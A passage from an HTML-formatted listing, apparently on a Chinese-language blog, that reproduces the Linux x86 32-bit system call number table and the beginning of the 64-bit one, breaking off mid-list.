class="comment">#define __NR_ftime 35</span></span><br><span class="line">        <span class="comment">#define __NR_sync 36</span></span><br><span class="line">        <span class="comment">#define __NR_kill 37</span></span><br><span class="line">        <span class="comment">#define __NR_rename 38</span></span><br><span class="line">        <span class="comment">#define __NR_mkdir 39</span></span><br><span class="line">        <span class="comment">#define __NR_rmdir 40</span></span><br><span class="line">        <span class="comment">#define __NR_dup 41</span></span><br><span class="line">        <span class="comment">#define __NR_pipe 42</span></span><br><span class="line">        <span class="comment">#define __NR_times 43</span></span><br><span class="line">        <span class="comment">#define __NR_prof 44</span></span><br><span class="line">        <span class="comment">#define __NR_brk 45</span></span><br><span class="line">        <span class="comment">#define __NR_setgid 46</span></span><br><span class="line">        <span class="comment">#define __NR_getgid 47</span></span><br><span class="line">        <span class="comment">#define __NR_signal 48</span></span><br><span class="line">        <span class="comment">#define __NR_geteuid 49</span></span><br><span class="line">        <span class="comment">#define __NR_getegid 50</span></span><br><span class="line">        <span class="comment">#define __NR_acct 51</span></span><br><span class="line">        <span class="comment">#define __NR_umount2 52</span></span><br><span class="line">        <span class="comment">#define __NR_lock 53</span></span><br><span class="line">        <span class="comment">#define __NR_ioctl 54</span></span><br><span class="line">        <span class="comment">#define __NR_fcntl 55</span></span><br><span class="line">        <span class="comment">#define __NR_mpx 56</span></span><br><span class="line">        <span class="comment">#define __NR_setpgid 57</span></span><br><span class="line">        <span class="comment">#define __NR_ulimit 58</span></span><br><span class="line">        <span class="comment">#define __NR_oldolduname 59</span></span><br><span class="line">        <span class="comment">#define __NR_umask 60</span></span><br><span class="line">        <span class="comment">#define __NR_chroot 61</span></span><br><span class="line">        <span class="comment">#define __NR_ustat 62</span></span><br><span class="line">        <span class="comment">#define __NR_dup2 63</span></span><br><span class="line">        <span class="comment">#define __NR_getppid 64</span></span><br><span class="line">        <span class="comment">#define __NR_getpgrp 65</span></span><br><span class="line">        <span class="comment">#define __NR_setsid 66</span></span><br><span class="line">        <span class="comment">#define __NR_sigaction 67</span></span><br><span class="line">        <span class="comment">#define __NR_sgetmask 68</span></span><br><span class="line">        <span class="comment">#define __NR_ssetmask 69</span></span><br><span class="line">        <span class="comment">#define __NR_setreuid 70</span></span><br><span class="line">        <span class="comment">#define __NR_setregid 71</span></span><br><span class="line">        <span class="comment">#define __NR_sigsuspend 72</span></span><br><span class="line">        <span class="comment">#define __NR_sigpending 73</span></span><br><span class="line">        <span class="comment">#define __NR_sethostname 74</span></span><br><span class="line">        <span class="comment">#define __NR_setrlimit 75</span></span><br><span class="line">        <span class="comment">#define __NR_getrlimit 76</span></span><br><span class="line">        <span class="comment">#define __NR_getrusage 77</span></span><br><span class="line">        <span class="comment">#define __NR_gettimeofday 78</span></span><br><span class="line">        <span class="comment">#define __NR_settimeofday 79</span></span><br><span class="line">        <span class="comment">#define __NR_getgroups 80</span></span><br><span class="line">        <span class="comment">#define __NR_setgroups 81</span></span><br><span class="line">        <span class="comment">#define __NR_select 82</span></span><br><span class="line">        <span class="comment">#define __NR_symlink 83</span></span><br><span class="line">        <span class="comment">#define __NR_oldlstat 84</span></span><br><span class="line">        <span class="comment">#define __NR_readlink 85</span></span><br><span class="line">        <span class="comment">#define __NR_uselib 86</span></span><br><span class="line">        <span class="comment">#define __NR_swapon 87</span></span><br><span class="line">        <span class="comment">#define __NR_reboot 88</span></span><br><span class="line">        <span class="comment">#define __NR_readdir 89</span></span><br><span class="line">        <span class="comment">#define __NR_mmap 90</span></span><br><span class="line">        <span class="comment">#define __NR_munmap 91</span></span><br><span class="line">        <span class="comment">#define __NR_truncate 92</span></span><br><span class="line">        <span class="comment">#define __NR_ftruncate 93</span></span><br><span class="line">        <span class="comment">#define __NR_fchmod 94</span></span><br><span class="line">        <span class="comment">#define __NR_fchown 95</span></span><br><span class="line">        <span class="comment">#define __NR_getpriority 96</span></span><br><span class="line">        <span class="comment">#define __NR_setpriority 97</span></span><br><span class="line">        <span class="comment">#define __NR_profil 98</span></span><br><span class="line">        <span class="comment">#define __NR_statfs 99</span></span><br><span class="line">        <span class="comment">#define __NR_fstatfs 100</span></span><br><span class="line">        <span class="comment">#define __NR_ioperm 101</span></span><br><span class="line">        <span class="comment">#define __NR_socketcall 102</span></span><br><span class="line">        <span class="comment">#define __NR_syslog 103</span></span><br><span class="line">        <span class="comment">#define __NR_setitimer 104</span></span><br><span class="line">        <span class="comment">#define __NR_getitimer 105</span></span><br><span class="line">        <span class="comment">#define __NR_stat 106</span></span><br><span class="line">        <span class="comment">#define __NR_lstat 107</span></span><br><span class="line">        <span class="comment">#define __NR_fstat 108</span></span><br><span class="line">        <span class="comment">#define __NR_olduname 109</span></span><br><span class="line">        <span class="comment">#define __NR_iopl 110</span></span><br><span class="line">        <span class="comment">#define __NR_vhangup 111</span></span><br><span class="line">        <span class="comment">#define __NR_idle 112</span></span><br><span class="line">        <span class="comment">#define __NR_vm86old 113</span></span><br><span class="line">        <span class="comment">#define __NR_wait4 114</span></span><br><span class="line">        <span class="comment">#define __NR_swapoff 115</span></span><br><span class="line">        <span class="comment">#define __NR_sysinfo 116</span></span><br><span class="line">        <span class="comment">#define __NR_ipc 117</span></span><br><span class="line">        <span class="comment">#define __NR_fsync 118</span></span><br><span class="line">        <span class="comment">#define __NR_sigreturn 119</span></span><br><span class="line">        <span class="comment">#define __NR_clone 120</span></span><br><span class="line">        <span class="comment">#define __NR_setdomainname 121</span></span><br><span class="line">        <span class="comment">#define __NR_uname 122</span></span><br><span class="line">        <span class="comment">#define __NR_modify_ldt 123</span></span><br><span class="line">        <span class="comment">#define __NR_adjtimex 124</span></span><br><span class="line">        <span class="comment">#define __NR_mprotect 125</span></span><br><span class="line">        <span class="comment">#define __NR_sigprocmask 126</span></span><br><span class="line">        <span class="comment">#define __NR_create_module 127</span></span><br><span class="line">        <span class="comment">#define __NR_init_module 128</span></span><br><span class="line">        <span class="comment">#define __NR_delete_module 129</span></span><br><span class="line">        <span class="comment">#define __NR_get_kernel_syms 130</span></span><br><span class="line">        <span class="comment">#define __NR_quotactl 131</span></span><br><span class="line">        <span class="comment">#define __NR_getpgid 132</span></span><br><span class="line">        <span class="comment">#define __NR_fchdir 133</span></span><br><span class="line">        <span class="comment">#define __NR_bdflush 134</span></span><br><span class="line">        <span class="comment">#define __NR_sysfs 135</span></span><br><span class="line">        <span class="comment">#define __NR_personality 136</span></span><br><span class="line">        <span class="comment">#define __NR_afs_syscall 137</span></span><br><span class="line">        <span class="comment">#define __NR_setfsuid 138</span></span><br><span class="line">        <span class="comment">#define __NR_setfsgid 139</span></span><br><span class="line">        <span class="comment">#define __NR__llseek 140</span></span><br><span class="line">        <span class="comment">#define __NR_getdents 141</span></span><br><span class="line">        <span class="comment">#define __NR__newselect 142</span></span><br><span class="line">        <span class="comment">#define __NR_flock 143</span></span><br><span class="line">        <span class="comment">#define __NR_msync 144</span></span><br><span class="line">        <span class="comment">#define __NR_readv 145</span></span><br><span class="line">        <span class="comment">#define __NR_writev 146</span></span><br><span class="line">        <span class="comment">#define __NR_getsid 147</span></span><br><span class="line">        <span class="comment">#define __NR_fdatasync 148</span></span><br><span class="line">        <span class="comment">#define __NR__sysctl 149</span></span><br><span class="line">        <span class="comment">#define __NR_mlock 150</span></span><br><span class="line">        <span class="comment">#define __NR_munlock 151</span></span><br><span class="line">        <span class="comment">#define __NR_mlockall 152</span></span><br><span class="line">        <span class="comment">#define __NR_munlockall 153</span></span><br><span class="line">        <span class="comment">#define __NR_sched_setparam 154</span></span><br><span class="line">        <span class="comment">#define __NR_sched_getparam 155</span></span><br><span class="line">        <span class="comment">#define __NR_sched_setscheduler 156</span></span><br><span class="line">        <span class="comment">#define __NR_sched_getscheduler 157</span></span><br><span class="line">        <span class="comment">#define __NR_sched_yield 158</span></span><br><span class="line">        <span class="comment">#define __NR_sched_get_priority_max 159</span></span><br><span class="line">        <span class="comment">#define __NR_sched_get_priority_min 160</span></span><br><span class="line">        <span class="comment">#define __NR_sched_rr_get_interval 161</span></span><br><span class="line">        <span class="comment">#define __NR_nanosleep 162</span></span><br><span class="line">        <span class="comment">#define __NR_mremap 163</span></span><br><span class="line">        <span class="comment">#define __NR_setresuid 164</span></span><br><span class="line">        <span class="comment">#define __NR_getresuid 165</span></span><br><span class="line">        <span class="comment">#define __NR_vm86 166</span></span><br><span class="line">        <span class="comment">#define __NR_query_module 167</span></span><br><span class="line">        <span class="comment">#define __NR_poll 168</span></span><br><span class="line">        <span class="comment">#define __NR_nfsservctl 169</span></span><br><span class="line">        <span class="comment">#define __NR_setresgid 170</span></span><br><span class="line">        <span class="comment">#define __NR_getresgid 171</span></span><br><span class="line">        <span class="comment">#define __NR_prctl 172</span></span><br><span class="line">        <span class="comment">#define __NR_rt_sigreturn 173</span></span><br><span class="line">        <span class="comment">#define __NR_rt_sigaction 174</span></span><br><span class="line">        <span class="comment">#define __NR_rt_sigprocmask 175</span></span><br><span class="line">        <span class="comment">#define __NR_rt_sigpending 176</span></span><br><span class="line">        <span class="comment">#define __NR_rt_sigtimedwait 177</span></span><br><span class="line">        <span class="comment">#define __NR_rt_sigqueueinfo 178</span></span><br><span class="line">        <span class="comment">#define __NR_rt_sigsuspend 179</span></span><br><span class="line">        <span class="comment">#define __NR_pread64 180</span></span><br><span class="line">        <span class="comment">#define __NR_pwrite64 181</span></span><br><span class="line">        <span class="comment">#define __NR_chown 182</span></span><br><span class="line">        <span class="comment">#define __NR_getcwd 183</span></span><br><span class="line">        <span class="comment">#define __NR_capget 184</span></span><br><span class="line">        <span class="comment">#define __NR_capset 185</span></span><br><span class="line">        <span class="comment">#define __NR_sigaltstack 186</span></span><br><span class="line">        <span class="comment">#define __NR_sendfile 187</span></span><br><span class="line">        <span class="comment">#define __NR_getpmsg 188</span></span><br><span class="line">        <span class="comment">#define __NR_putpmsg 189</span></span><br><span class="line">        <span class="comment">#define __NR_vfork 190</span></span><br><span class="line">        <span class="comment">#define __NR_ugetrlimit 191</span></span><br><span class="line">        <span class="comment">#define __NR_mmap2 192</span></span><br><span class="line">        <span class="comment">#define __NR_truncate64 193</span></span><br><span class="line">        <span class="comment">#define __NR_ftruncate64 194</span></span><br><span class="line">        <span class="comment">#define __NR_stat64 195</span></span><br><span class="line">        <span class="comment">#define __NR_lstat64 196</span></span><br><span class="line">        <span class="comment">#define __NR_fstat64 197</span></span><br><span class="line">        <span class="comment">#define __NR_lchown32 198</span></span><br><span class="line">        <span class="comment">#define __NR_getuid32 199</span></span><br><span class="line">        <span class="comment">#define __NR_getgid32 200</span></span><br><span class="line">        <span class="comment">#define __NR_geteuid32 201</span></span><br><span class="line">        <span class="comment">#define __NR_getegid32 202</span></span><br><span class="line">        <span class="comment">#define __NR_setreuid32 203</span></span><br><span class="line">        <span class="comment">#define __NR_setregid32 204</span></span><br><span class="line">        <span class="comment">#define __NR_getgroups32 205</span></span><br><span class="line">        <span class="comment">#define __NR_setgroups32 206</span></span><br><span class="line">        <span class="comment">#define __NR_fchown32 207</span></span><br><span class="line">        <span class="comment">#define __NR_setresuid32 208</span></span><br><span class="line">        <span class="comment">#define __NR_getresuid32 209</span></span><br><span class="line">        <span class="comment">#define __NR_setresgid32 210</span></span><br><span class="line">        <span class="comment">#define __NR_getresgid32 211</span></span><br><span class="line">        <span class="comment">#define __NR_chown32 212</span></span><br><span class="line">        <span class="comment">#define __NR_setuid32 213</span></span><br><span class="line">        <span class="comment">#define __NR_setgid32 214</span></span><br><span class="line">        <span class="comment">#define __NR_setfsuid32 215</span></span><br><span class="line">        <span class="comment">#define __NR_setfsgid32 216</span></span><br><span class="line">        <span class="comment">#define __NR_pivot_root 217</span></span><br><span class="line">        <span class="comment">#define __NR_mincore 218</span></span><br><span class="line">        <span class="comment">#define __NR_madvise 219</span></span><br><span class="line">        <span class="comment">#define __NR_getdents64 220</span></span><br><span class="line">        <span class="comment">#define __NR_fcntl64 221</span></span><br><span class="line">        <span class="comment">#define __NR_gettid 224</span></span><br><span class="line">        <span class="comment">#define __NR_readahead 225</span></span><br><span class="line">        <span class="comment">#define __NR_setxattr 226</span></span><br><span class="line">        <span class="comment">#define __NR_lsetxattr 227</span></span><br><span class="line">        <span class="comment">#define __NR_fsetxattr 228</span></span><br><span class="line">        <span class="comment">#define __NR_getxattr 229</span></span><br><span class="line">        <span class="comment">#define __NR_lgetxattr 230</span></span><br><span class="line">        <span class="comment">#define __NR_fgetxattr 231</span></span><br><span class="line">        <span class="comment">#define __NR_listxattr 232</span></span><br><span class="line">        <span class="comment">#define __NR_llistxattr 233</span></span><br><span class="line">        <span class="comment">#define __NR_flistxattr 234</span></span><br><span class="line">        <span class="comment">#define __NR_removexattr 235</span></span><br><span class="line">        <span class="comment">#define __NR_lremovexattr 236</span></span><br><span class="line">        <span class="comment">#define __NR_fremovexattr 237</span></span><br><span class="line">        <span class="comment">#define __NR_tkill 238</span></span><br><span class="line">        <span class="comment">#define __NR_sendfile64 239</span></span><br><span class="line">        <span class="comment">#define __NR_futex 240</span></span><br><span class="line">        <span class="comment">#define __NR_sched_setaffinity 241</span></span><br><span class="line">        <span class="comment">#define __NR_sched_getaffinity 242</span></span><br><span class="line">        <span class="comment">#define __NR_set_thread_area 243</span></span><br><span class="line">        <span class="comment">#define __NR_get_thread_area 244</span></span><br><span class="line">        <span class="comment">#define __NR_io_setup 245</span></span><br><span class="line">        <span class="comment">#define __NR_io_destroy 246</span></span><br><span class="line">        <span class="comment">#define __NR_io_getevents 247</span></span><br><span class="line">        <span class="comment">#define __NR_io_submit 248</span></span><br><span class="line">        <span class="comment">#define __NR_io_cancel 249</span></span><br><span class="line">        <span class="comment">#define __NR_fadvise64 250</span></span><br><span class="line">        <span class="comment">#define __NR_exit_group 252</span></span><br><span class="line">        <span class="comment">#define __NR_lookup_dcookie 253</span></span><br><span class="line">        <span class="comment">#define __NR_epoll_create 254</span></span><br><span class="line">        <span class="comment">#define __NR_epoll_ctl 255</span></span><br><span class="line">        <span class="comment">#define __NR_epoll_wait 256</span></span><br><span class="line">        <span class="comment">#define __NR_remap_file_pages 257</span></span><br><span class="line">        <span class="comment">#define __NR_set_tid_address 258</span></span><br><span class="line">        <span class="comment">#define __NR_timer_create 259</span></span><br><span class="line">        <span class="comment">#define __NR_timer_settime 260</span></span><br><span class="line">        <span class="comment">#define __NR_timer_gettime 261</span></span><br><span class="line">        <span class="comment">#define __NR_timer_getoverrun 262</span></span><br><span class="line">        <span class="comment">#define __NR_timer_delete 263</span></span><br><span class="line">        <span class="comment">#define __NR_clock_settime 264</span></span><br><span class="line">        <span class="comment">#define __NR_clock_gettime 265</span></span><br><span class="line">        <span class="comment">#define __NR_clock_getres 266</span></span><br><span class="line">        <span class="comment">#define __NR_clock_nanosleep 267</span></span><br><span class="line">        <span class="comment">#define __NR_statfs64 268</span></span><br><span class="line">        <span class="comment">#define __NR_fstatfs64 269</span></span><br><span class="line">        <span class="comment">#define __NR_tgkill 270</span></span><br><span class="line">        <span class="comment">#define __NR_utimes 271</span></span><br><span class="line">        <span class="comment">#define __NR_fadvise64_64 272</span></span><br><span class="line">        <span class="comment">#define __NR_vserver 273</span></span><br><span class="line">        <span class="comment">#define __NR_mbind 274</span></span><br><span class="line">        <span class="comment">#define __NR_get_mempolicy 275</span></span><br><span class="line">        <span class="comment">#define __NR_set_mempolicy 276</span></span><br><span class="line">        <span class="comment">#define __NR_mq_open 277</span></span><br><span class="line">        <span class="comment">#define __NR_mq_unlink 278</span></span><br><span class="line">        <span class="comment">#define __NR_mq_timedsend 279</span></span><br><span class="line">        <span class="comment">#define __NR_mq_timedreceive 280</span></span><br><span class="line">        <span class="comment">#define __NR_mq_notify 281</span></span><br><span class="line">        <span class="comment">#define __NR_mq_getsetattr 282</span></span><br><span class="line">        <span class="comment">#define __NR_kexec_load 283</span></span><br><span class="line">        <span class="comment">#define __NR_waitid 284</span></span><br><span class="line">        <span class="comment">#define __NR_add_key 286</span></span><br><span class="line">        <span class="comment">#define __NR_request_key 287</span></span><br><span class="line">        <span class="comment">#define __NR_keyctl 288</span></span><br><span class="line">        <span class="comment">#define __NR_ioprio_set 289</span></span><br><span class="line">        <span class="comment">#define __NR_ioprio_get 290</span></span><br><span class="line">        <span class="comment">#define __NR_inotify_init 291</span></span><br><span class="line">        <span class="comment">#define __NR_inotify_add_watch 292</span></span><br><span class="line">        <span class="comment">#define __NR_inotify_rm_watch 293</span></span><br><span class="line">        <span class="comment">#define __NR_migrate_pages 294</span></span><br><span class="line">        <span class="comment">#define __NR_openat 295</span></span><br><span class="line">        <span class="comment">#define __NR_mkdirat 296</span></span><br><span class="line">        <span class="comment">#define __NR_mknodat 297</span></span><br><span class="line">        <span class="comment">#define __NR_fchownat 298</span></span><br><span class="line">        <span class="comment">#define __NR_futimesat 299</span></span><br><span class="line">        <span class="comment">#define __NR_fstatat64 300</span></span><br><span class="line">        <span class="comment">#define __NR_unlinkat 301</span></span><br><span class="line">        <span class="comment">#define __NR_renameat 302</span></span><br><span class="line">        <span class="comment">#define __NR_linkat 303</span></span><br><span class="line">        <span class="comment">#define __NR_symlinkat 304</span></span><br><span class="line">        <span class="comment">#define __NR_readlinkat 305</span></span><br><span class="line">        <span class="comment">#define __NR_fchmodat 306</span></span><br><span class="line">        <span class="comment">#define __NR_faccessat 307</span></span><br><span class="line">        <span class="comment">#define __NR_pselect6 308</span></span><br><span class="line">        <span class="comment">#define __NR_ppoll 309</span></span><br><span class="line">        <span class="comment">#define __NR_unshare 310</span></span><br><span class="line">        <span class="comment">#define __NR_set_robust_list 311</span></span><br><span class="line">        <span class="comment">#define __NR_get_robust_list 312</span></span><br><span class="line">        <span class="comment">#define __NR_splice 313</span></span><br><span class="line">        <span class="comment">#define __NR_sync_file_range 314</span></span><br><span class="line">        <span class="comment">#define __NR_tee 315</span></span><br><span class="line">        <span class="comment">#define __NR_vmsplice 316</span></span><br><span class="line">        <span class="comment">#define __NR_move_pages 317</span></span><br><span class="line">        <span class="comment">#define __NR_getcpu 318</span></span><br><span class="line">        <span class="comment">#define __NR_epoll_pwait 319</span></span><br><span class="line">        <span class="comment">#define __NR_utimensat 320</span></span><br><span class="line">        <span class="comment">#define __NR_signalfd 321</span></span><br><span class="line">        <span class="comment">#define __NR_timerfd_create 322</span></span><br><span class="line">        <span class="comment">#define __NR_eventfd 323</span></span><br><span class="line">        <span class="comment">#define __NR_fallocate 324</span></span><br><span class="line">        <span class="comment">#define __NR_timerfd_settime 325</span></span><br><span class="line">        <span class="comment">#define __NR_timerfd_gettime 326</span></span><br><span class="line">        <span class="comment">#define __NR_signalfd4 327</span></span><br><span class="line">        <span class="comment">#define __NR_eventfd2 328</span></span><br><span class="line">        <span class="comment">#define __NR_epoll_create1 329</span></span><br><span class="line">        <span class="comment">#define __NR_dup3 330</span></span><br><span class="line">        <span class="comment">#define __NR_pipe2 331</span></span><br><span class="line">        <span class="comment">#define __NR_inotify_init1 332</span></span><br><span class="line">        <span class="comment">#define __NR_preadv 333</span></span><br><span class="line">        <span class="comment">#define __NR_pwritev 334</span></span><br><span class="line">        <span class="comment">#define __NR_rt_tgsigqueueinfo 335</span></span><br><span class="line">        <span class="comment">#define __NR_perf_event_open 336</span></span><br><span class="line">        <span class="comment">#define __NR_recvmmsg 337</span></span><br><span class="line">        <span class="comment">#define __NR_fanotify_init 338</span></span><br><span class="line">        <span class="comment">#define __NR_fanotify_mark 339</span></span><br><span class="line">        <span class="comment">#define __NR_prlimit64 340</span></span><br><span class="line">        <span class="comment">#define __NR_name_to_handle_at 341</span></span><br><span class="line">        <span class="comment">#define __NR_open_by_handle_at 342</span></span><br><span class="line">        <span class="comment">#define __NR_clock_adjtime 343</span></span><br><span class="line">        <span class="comment">#define __NR_syncfs 344</span></span><br><span class="line">        <span class="comment">#define __NR_sendmmsg 345</span></span><br><span class="line">        <span class="comment">#define __NR_setns 346</span></span><br><span class="line">        <span class="comment">#define __NR_process_vm_readv 347</span></span><br><span class="line">        <span class="comment">#define __NR_process_vm_writev 348</span></span><br><span class="line">        <span class="comment">#define __NR_kcmp 349</span></span><br><span class="line">        <span class="comment">#define __NR_finit_module 350</span></span><br><span class="line">        <span class="comment">#define __NR_sched_setattr 351</span></span><br><span class="line">        <span class="comment">#define __NR_sched_getattr 352</span></span><br><span class="line">        <span class="comment">#define __NR_renameat2 353</span></span><br><span class="line">        <span class="comment">#define __NR_seccomp 354</span></span><br><span class="line">        <span class="comment">#define __NR_getrandom 355</span></span><br><span class="line">        <span class="comment">#define __NR_memfd_create 356</span></span><br><span class="line">        <span class="comment">#define __NR_bpf 357</span></span><br><span class="line">        <span class="comment">#define __NR_execveat 358</span></span><br><span class="line">        <span class="comment">#define __NR_socket 359</span></span><br><span class="line">        <span class="comment">#define __NR_socketpair 360</span></span><br><span class="line">        <span class="comment">#define __NR_bind 361</span></span><br><span class="line">        <span class="comment">#define __NR_connect 362</span></span><br><span class="line">        <span class="comment">#define __NR_listen 363</span></span><br><span class="line">        <span class="comment">#define __NR_accept4 364</span></span><br><span class="line">        <span class="comment">#define __NR_getsockopt 365</span></span><br><span class="line">        <span class="comment">#define __NR_setsockopt 366</span></span><br><span class="line">        <span class="comment">#define __NR_getsockname 367</span></span><br><span class="line">        <span class="comment">#define __NR_getpeername 368</span></span><br><span class="line">        <span class="comment">#define __NR_sendto 369</span></span><br><span class="line">        <span class="comment">#define __NR_sendmsg 370</span></span><br><span class="line">        <span class="comment">#define __NR_recvfrom 371</span></span><br><span class="line">        <span class="comment">#define __NR_recvmsg 372</span></span><br><span class="line">        <span class="comment">#define __NR_shutdown 373</span></span><br><span class="line">        <span class="comment">#define __NR_userfaultfd 374</span></span><br><span class="line">        <span class="comment">#define __NR_membarrier 375</span></span><br><span class="line">        <span class="comment">#define __NR_mlock2 376</span></span><br><span class="line">        <span class="comment">#define __NR_copy_file_range 377</span></span><br><span class="line">        <span class="comment">#define __NR_preadv2 378</span></span><br><span class="line">        <span class="comment">#define __NR_pwritev2 379</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#endif /* _ASM_X86_UNISTD_32_H */</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        64位：</span><br><span class="line">        <span class="comment">#ifndef _ASM_X86_UNISTD_64_H</span></span><br><span class="line">        <span class="comment">#define _ASM_X86_UNISTD_64_H 1</span></span><br><span class="line">        <span class="comment">#define __NR_read 0</span></span><br><span class="line">        <span class="comment">#define __NR_write 1</span></span><br><span class="line">        <span class="comment">#define __NR_open 2</span></span><br><span class="line">        <span class="comment">#define __NR_close 3</span></span><br><span class="line">        <span class="comment">#define __NR_stat 4</span></span><br><span class="line">        <span class="comment">#define __NR_fstat 5</span></span><br><span class="line">        <span class="comment">#define __NR_lstat 6</span></span><br><span class="line">        <span class="comment">#define __NR_poll 7</span></span><br><span class="line">        <span class="comment">#define __NR_lseek 8</span></span><br><span class="line">        <span class="comment">#define __NR_mmap 9</span></span><br><span class="line">        <span class="comment">#define __NR_mprotect 10</span></span><br><span class="line">        <span class="comment">#define __NR_munmap 11</span></span><br><span class="line">        <span class="comment">#define __NR_brk 12</span></span><br><span class="line">        <span class="comment">#define __NR_rt_sigaction 13</span></span><br><span class="line">        <span class="comment">#define __NR_rt_sigprocmask 14</span></span><br><span class="line">        <span class="comment">#define __NR_rt_sigreturn 15</span></span><br><span class="line">        <span class="comment">#define __NR_ioctl 16</span></span><br><span class="line">        <span class="comment">#define __NR_pread64 17</span></span><br><span class="line">        <span class="comment">#define __NR_pwrite64 18</span></span><br><span class="line">        <span class="comment">#define __NR_readv 19</span></span><br><span class="line">        <span class="comment">#define __NR_writev 20</span></span><br><span class="line">        <span class="comment">#define __NR_access 21</span></span><br><span class="line">        <span class="comment">#define __NR_pipe 22</span></span><br><span class="line">        <span class="comment">#define __NR_select 23</span></span><br><span class="line">        <span class="comment">#define __NR_sched_yield 24</span></span><br><span class="line">        <span class="comment">#define __NR_mremap 25</span></span><br><span class="line">        <span class="comment">#define __NR_msync 26</span></span><br><span class="line">        <span class="comment">#define __NR_mincore 27</span></span><br><span class="line">        <span class="comment">#define __NR_madvise 28</span></span><br><span class="line">        <span class="comment">#define __NR_shmget 29</span></span><br><span class="line">        <span class="comment">#define __NR_shmat 30</span></span><br><span class="line">        <span class="comment">#define __NR_shmctl 31</span></span><br><span class="line">        <span class="comment">#define __NR_dup 32</span></span><br><span class="line">        <span class="comment">#define __NR_dup2 33</span></span><br><span class="line">        <span class="comment">#define __NR_pause 34</span></span><br><span class="line">        <span class="comment">#define __NR_nanosleep 35</span></span><br><span class="line">        <span class="comment">#define __NR_getitimer 36</span></span><br><span class="line">        <span class="comment">#define __NR_alarm 37</span></span><br><span class="line">        <span class="comment">#define __NR_setitimer 38</span></span><br><span class="line">        <span class="comment">#define __NR_getpid 39</span></span><br><span class="line">        <span class="comment">#define __NR_sendfile 40</span></span><br><span class="line">        <span class="comment">#define __NR_socket 41</span></span><br><span class="line">        <span class="comment">#define __NR_connect 42</span></span><br><span class="line">        <span class="comment">#define __NR_accept 43</span></span><br><span class="line">        <span class="comment">#define __NR_sendto 44</span></span><br><span class="line">        <span class="comment">#define __NR_recvfrom 45</span></span><br><span class="line">        <span class="comment">#define __NR_sendmsg 46</span></span><br><span class="line">        <span class="comment">#define __NR_recvmsg 47</span></span><br><span class="line">        <span class="comment">#define __NR_shutdown 48</span></span><br><span class="line">        <span class="comment">#define __NR_bind 49</span></span><br><span class="line">        <span class="comment">#define __NR_listen 50</span></span><br><span class="line">        <span class="comment">#define __NR_getsockname 51</span></span><br><span class="line">        <span class="comment">#define __NR_getpeername 52</span></span><br><span class="line">        <span class="comment">#define __NR_socketpair 53</span></span><br><span class="line">        <span class="comment">#define __NR_setsockopt 54</span></span><br><span class="line">        <span class="comment">#define __NR_getsockopt 55</span></span><br><span class="line">        <span class="comment">#define __NR_clone 56</span></span><br><span class="line">        <span class="comment">#define __NR_fork 57</span></span><br><span class="line">        <span class="comment">#define __NR_vfork 58</span></span><br><span class="line">        <span class="comment">#define __NR_execve 59</span></span><br><span class="line">        <span class="comment">#define __NR_exit 60</span></span><br><span class="line">        <span class="comment">#define __NR_wait4 61</span></span><br><span class="line">        <span class="comment">#define __NR_kill 62</span></span><br><span class="line">        <span class="comment">#define __NR_uname 63</span></span><br><span class="line">        <span class="comment">#define __NR_semget 64</span></span><br><span class="line">        <span class="comment">#define __NR_semop 65</span></span><br><span class="line">        <span class="comment">#define __NR_semctl 66</span></span><br><span class="line">        <span class="comment">#define __NR_shmdt 67</span></span><br><span class="line">        <span class="comment">#define __NR_msgget 68</span></span><br><span class="line">        <span class="comment">#define __NR_msgsnd 69</span></span><br><span class="line">        <span class="comment">#define __NR_msgrcv 70</span></span><br><span class="line">        <span class="comment">#define __NR_msgctl 71</span></span><br><span class="line">        <span class="comment">#define __NR_fcntl 72</span></span><br><span class="line">        <span class="comment">#define __NR_flock 73</span></span><br><span class="line">        <span class="comment">#define __NR_fsync 74</span></span><br><span class="line">        <span class="comment">#define __NR_fdatasync 75</span></span><br><span class="line">        <span class="comment">#define __NR_truncate 76</span></span><br><span class="line">        <span class="comment">#define __NR_ftruncate 77</span></span><br><span class="line">        <span class="comment">#define __NR_getdents 78</span></span><br><span class="line">        <span class="comment">#define __NR_getcwd 79</span></span><br><span class="line">        <span class="comment">#define __NR_chdir 80</span></span><br><span class="line">        <span class="comment">#define __NR_fchdir 81</span></span><br><span class="line">        <span class="comment">#define __NR_rename 82</span></span><br><span class="line">        <span class="comment">#define __NR_mkdir 83</span></span><br><span class="line">        <span class="comment">#define __NR_rmdir 84</span></span><br><span class="line">        <span class="comment">#define __NR_creat 85</span></span><br><span class="line">        <span class="comment">#define __NR_link 86</span></span><br><span class="line">        <span class="comment">#define __NR_unlink 87</span></span><br><span class="line">        <span class="comment">#define __NR_symlink 88</span></span><br><span class="line">        <span class="comment">#define __NR_readlink 89</span></span><br><span class="line">        <span class="comment">#define __NR_chmod 90</span></span><br><span class="line">        <span class="comment">#define __NR_fchmod 91</span></span><br><span class="line">        <span class="comment">#define __NR_chown 92</span></span><br><span class="line">        <span class="comment">#define __NR_fchown 93</span></span><br><span class="line">        <span class="comment">#define __NR_lchown 94</span></span><br><span class="line">        <span class="comment">#define __NR_umask 95</span></span><br><span class="line">        <span class="comment">#define __NR_gettimeofday 96</span></span><br><span class="line">        <span class="comment">#define __NR_getrlimit 97</span></span><br><span class="line">        <span class="comment">#define __NR_getrusage 98</span></span><br><span class="line">        <span class="comment">#define __NR_sysinfo 99</span></span><br><span class="line">        <span class="comment">#define __NR_times 100</span></span><br><span class="line">        <span class="comment">#define __NR_ptrace 101</span></span><br><span class="line">        <span class="comment">#define __NR_getuid 102</span></span><br><span class="line">        <span class="comment">#define __NR_syslog 103</span></span><br><span class="line">        <span class="comment">#define __NR_getgid 104</span></span><br><span class="line">        <span class="comment">#define __NR_setuid 105</span></span><br><span class="line">        <span class="comment">#define __NR_setgid 106</span></span><br><span class="line">        <span class="comment">#define __NR_geteuid 107</span></span><br><span class="line">        <span class="comment">#define __NR_getegid 108</span></span><br><span class="line">        <span class="comment">#define __NR_setpgid 109</span></span><br><span class="line">        <span class="comment">#define __NR_getppid 110</span></span><br><span class="line">        <span class="comment">#define __NR_getpgrp 111</span></span><br><span class="line">        <span class="comment">#define __NR_setsid 112</span></span><br><span class="line">        <span class="comment">#define __NR_setreuid 113</span></span><br><span class="line">        <span class="comment">#define __NR_setregid 114</span></span><br><span class="line">        <span class="comment">#define __NR_getgroups 115</span></span><br><span class="line">        <span class="comment">#define __NR_setgroups 116</span></span><br><span class="line">        <span class="comment">#define __NR_setresuid 117</span></span><br><span class="line">        <span class="comment">#define __NR_getresuid 118</span></span><br><span class="line">        <span class="comment">#define 